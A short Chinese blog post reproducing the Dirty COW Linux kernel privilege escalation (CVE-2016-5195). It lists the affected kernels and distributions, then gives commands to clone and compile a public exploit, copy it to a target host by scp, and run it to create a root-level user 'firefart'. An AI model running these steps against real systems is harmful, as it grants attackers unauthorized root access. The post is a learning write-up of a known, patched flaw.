title: CVE2016-5195（dirty-cow）复现
author: 7h4mid4
tags:
  - 渗透
  - CVE
  - dirtycow
  - 提权
categories:
  - 渗透
date: 2019-08-16 20:14:00
---
今天对脏牛复现学习一下，以便于以后的使用。
## 总览
#### 漏洞范围：

Linux kernel >= 2.6.22

#### 危害：

低权限用户利用本漏洞在linux系统是实现本地提权
远程入侵获得低权限之后，才能进一步提权。

#### 影响范围：
从 2007 年发布 2.6.22 版本开始，直到2016年10月18日为止，这中间发行的所有 Linux 系统都受影响。

##### 查看方式：
```
uname -a
===> Linux AYxxxx 2.6.32-431.23.3.el6.x86_64 #1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

##### 简单辨别：
系统 | 版本
---|---
Centos | 5.8
CentOS | 5.1
Centos | 6.5
Centos | 7
Centos | 7.2
ubuntu | 12.04
ubuntu | 14.04
Debain | 6.0.9
Debain | 7.5.0
Debain | 8.0.4

## 利用方式

### 本地编译dirtycow发送至目标机

```
git clone https://github.com/FireFart/dirtycow.git

cd dirtycow

gcc -pthread dirty.c -o dirty -lcrypt

scp dirty test@192.168.165.224:/home/test/dirty

```

### ssh连接后创建root用户

```
ssh test@192.168.165.224

./dirty asdfg(root_user_passwd)
//waiting......

su firefart
```

Congratulations！！

当然，更多的还是现场尝试，因为很多的系统已经修复漏洞。
